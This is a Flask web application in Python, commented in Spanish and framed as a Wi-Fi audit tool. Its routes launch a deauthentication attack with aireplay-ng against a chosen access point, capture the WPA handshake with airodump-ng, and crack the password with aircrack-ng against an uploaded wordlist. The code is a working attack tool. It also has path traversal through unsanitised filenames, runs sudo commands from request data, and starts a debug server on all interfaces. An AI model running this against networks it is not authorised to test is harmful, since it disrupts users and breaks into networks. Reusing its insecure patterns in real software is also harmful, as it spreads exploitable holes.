from flask import Flask, request, jsonify, send_file
import os
import logging
import subprocess
from routes import register_routes

# Configuración del archivo de logs
log_path = "../logs/audit_logs.log"  # Ubicación de los logs fuera de src
os.makedirs(os.path.dirname(log_path), exist_ok=True)

logging.basicConfig(
    filename=log_path,
    level=logging.DEBUG,  # Cambiar a DEBUG para mayor detalle en el log
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Configuración del logger de consola
console = logging.StreamHandler()
console.setLevel(logging.DEBUG)
formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
console.setFormatter(formatter)
logging.getLogger("").addHandler(console)

# Inicialización de la aplicación Flask
app = Flask(
    __name__,
    template_folder=os.path.abspath('templates'),  # Ruta absoluta para evitar conflictos
    static_folder=os.path.abspath('static')        # Ruta absoluta para recursos estáticos
)

# Registro de rutas desde el módulo de rutas
register_routes(app)

@app.errorhandler(404)
def not_found_error(error):
    """Manejo de error 404 - Recurso no encontrado."""
    logging.warning("Ruta no encontrada")
    return jsonify({"error": "Recurso no encontrado"}), 404

@app.errorhandler(500)
def internal_error(error):
    """Manejo de error 500 - Error interno del servidor."""
    logging.error("Error interno del servidor")
    return jsonify({"error": "Error interno del servidor"}), 500

@app.route('/list_interfaces', methods=['GET'])
def list_interfaces_route():
    """Ruta para listar interfaces de red disponibles."""
    from services import list_interfaces
    try:
        interfaces = list_interfaces()
        if not interfaces:
            logging.warning("No se encontraron interfaces disponibles")
            return jsonify({"error": "No se encontraron interfaces disponibles"}), 404
        return jsonify({"interfaces": interfaces}), 200
    except Exception as e:
        logging.error(f"Error al listar interfaces: {e}")
        return jsonify({"error": "Error al listar interfaces"}), 500

@app.route("/capture_handshake", methods=["POST"])
def capture_handshake_route():
    """Ruta para capturar el handshake de una red Wi-Fi con ataque de desautenticación."""
    if not request.content_type or request.content_type != 'application/json':
        logging.error(f"Tipo de contenido no soportado: {request.content_type}")
        return jsonify({"error": "Content-Type debe ser application/json"}), 415

    try:
        data = request.get_json()
        if not data or 'bssid' not in data or 'channel' not in data or 'interface' not in data:
            logging.warning("Datos incompletos proporcionados en la solicitud")
            return jsonify({"error": "BSSID, canal e interfaz son obligatorios"}), 400

        bssid = data['bssid']
        channel = data['channel']
        interface = data['interface']

        # Configurar el canal de la interfaz
        logging.info(f"Configurando interfaz {interface} en el canal {channel}")
        subprocess.run(['sudo', 'iwconfig', interface, 'channel', channel], check=True)

        # Comando para capturar el handshake
        logging.info(f"Iniciando captura de handshake en BSSID: {bssid}")
        handshake_output_dir = "/home/kali/wifi_audit/src/"
        os.makedirs(handshake_output_dir, exist_ok=True)
        handshake_output = os.path.join(handshake_output_dir, f"handshake_{bssid.replace(':', '')}")
        
        # Comando de airodump-ng para capturar el handshake
        capture_command = [
            'sudo', 'airodump-ng', interface,
            '--bssid', bssid,
            '--channel', channel,
            '--write', handshake_output,
            '--output-format', 'cap'
        ]

        # Comando para realizar un ataque de desautenticación
        deauth_command = [
            'sudo', 'aireplay-ng', '--deauth', '10', '-a', bssid, interface
        ]

        # Lanzar los dos procesos en paralelo: captura y ataque
        capture_process = subprocess.Popen(capture_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        deauth_process = subprocess.Popen(deauth_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Esperar a que ambos procesos terminen (timeout de 20 segundos)
        try:
            capture_process.wait(timeout=20)
            deauth_process.wait(timeout=20)
        except subprocess.TimeoutExpired:
            capture_process.terminate()
            deauth_process.terminate()
            logging.info("Proceso de captura y desautenticación terminado después de 20 segundos")

        # Verificar si el archivo .cap fue creado
        cap_file = f"{handshake_output}-01.cap"
        if os.path.exists(cap_file):
            logging.info(f"Handshake capturado y guardado en {cap_file}")
            return jsonify({"status": "Handshake capturado exitosamente", "file": cap_file}), 200
        else:
            logging.warning("No se capturó el handshake")
            return jsonify({"error": "No se capturó el handshake"}), 500

    except subprocess.CalledProcessError as e:
        logging.error(f"Error al ejecutar el comando: {e}")
        return jsonify({"error": "Error al capturar el handshake"}), 500
    except Exception as e:
        logging.error(f"Error inesperado: {e}")
        return jsonify({"error": "Error al capturar el handshake"}), 500

@app.route("/download_handshake/<filename>", methods=["GET"])
def download_handshake(filename):
    """Ruta para descargar el archivo .cap del handshake."""
    file_path = os.path.join("/home/kali/wifi_audit/src", filename)
    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)
    else:
        logging.warning(f"Archivo no encontrado: {filename}")
        return jsonify({"error": "Archivo no encontrado"}), 404

import subprocess

import re

@app.route('/crack_password', methods=['POST'])
def crack_password():
    cap_file = request.files.get('capFile')
    dict_file = request.files.get('dictFile')
    
    if cap_file and dict_file:
        try:
            cap_file_path = "/home/kali/wifi_audit/src/" + cap_file.filename
            dict_file_path = "/home/kali/wifi_audit/src/" + dict_file.filename
            
            cap_file.save(cap_file_path)
            dict_file.save(dict_file_path)
            
            # Ejecutar aircrack-ng con los archivos recibidos
            command = ["aircrack-ng", cap_file_path, "-w", dict_file_path]
            result = subprocess.run(command, capture_output=True, text=True)

            if result.returncode == 0:
                if "KEY FOUND" in result.stdout:
                    return jsonify({"message": "Contraseña encontrada", "result": result.stdout}), 200
                else:
                    raise Exception(f"Error al crackear la contraseña: {result.stdout}")
            else:
                raise Exception(f"Error al ejecutar aircrack-ng: {result.stderr}")
        
        except Exception as e:
            app.logger.error(f"Error al crackear la contraseña: {e}")
            return jsonify({"error": f"Error al crackear la contraseña: {str(e)}"}), 500
    else:
        return jsonify({"error": "Archivos .cap o diccionario .txt no encontrados"}), 400

if __name__ == "__main__":
    print(f"Template folder: {os.path.abspath(app.template_folder)}")
    logging.info("Servidor Flask iniciado")
    app.run(debug=True, host="0.0.0.0", port=5000)
